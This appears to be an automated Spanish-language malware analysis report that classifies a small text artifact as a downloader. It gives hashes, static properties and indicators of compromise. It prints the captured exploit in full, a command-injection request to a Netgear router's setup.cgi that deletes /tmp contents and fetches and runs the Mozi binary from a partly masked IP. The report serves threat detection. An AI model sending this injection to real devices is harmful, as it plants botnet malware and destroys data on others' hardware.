# 🧬 Payload Analysis

`c50ddfa7e5bf627fe2abbb65cc29590af7d1d8a3ba390b3f8812f132238e0063`

## 📌 Resumen

Artefacto clasificado como **Downloader / Dropper** a partir de la evidencia disponible en Oráculo SOC. Comportamientos destacados: Descarga remota, Limpieza. Se asoció 1 comando observado o extraído.

## 🏷️ Clasificación

- **Categoría:** `Downloader / Dropper`
- **Confianza:** `Baja`
- **Riesgo:** `Medium`

## 🗓️ Registro

- **Registrado:** `2026-08-09T21:07:53+00:00`
- **Tipo de registro:** `snapshot inmutable`

## 🔐 Identidad

- **SHA256:** `c50ddfa7e5bf627fe2abbb65cc29590af7d1d8a3ba390b3f8812f132238e0063`
- **SHA1:** `dc8ca7cbbb1b8e6c193f12f86d5557ae4984f774`
- **MD5:** `5720fa1c97cf71e3597a070e96fbbf13`

## 🧪 Análisis estático

| Propiedad | Resultado |
| --- | --- |
| Descripción | ASCII text, with CRLF line terminators |
| Tamaño | 174 B |
| Entropía | 5.15 |
| Strings | 1 |

## 🧠 Comportamiento observado

1. **Descarga remota**
2. **Limpieza**

## 🔬 Evidencia de clasificación

- Capacidad detectada: Descarga remota
- Motivos técnicos: mime=ASCII text, with CRLF line terminators; iocs=4

## 🖥️ Comandos observados / extraídos

```text
GET /setup.cgi?next_file=netgear.cfg&todo=syscmd&cmd=rm+-rf+/tmp/*;wget+hxxp://100.5.97.XXX:53119/Mozi.m+-O+/tmp/netgear;
```

## 🌐 Indicadores

| Tipo | Valor | Contexto |
| --- | --- | --- |
| ip | 100.5.97.XXX | static_analysis |
| url | hxxp://100.5.97.XXX:53119/Mozi.m+-O+/tmp/netgear;sh+netgear&curpath=/&currentsetting.htm=1 | strings |
| hash | c50ddfa7e5bf627fe2abbb65cc29590af7d1d8a3ba390b3f8812f132238e0063 | static_analysis |
| command | GET /setup.cgi?next_file=netgear.cfg&todo=syscmd&cmd=rm+-rf+/tmp/*;wget+hxxp://100.5.97.XXX:53119/Mozi.m+-O+/tmp/netgear; | strings |
| ip | 162.4.163.XXX | artifact_source |

## 🔎 Triage

| Campo | Valor |
| --- | --- |
| Categoría | structured text |

## 🛡️ Nota de publicación

Este informe conserva una **fotografía del estado de análisis en la fecha de registro**. No se mantienen campos temporales de observación ni contadores vivos.

Las IPv4 públicas se anonimizaron como `A.B.C.XXX`; las direcciones internas, credenciales, tokens y otros secretos se redactan antes de publicar.
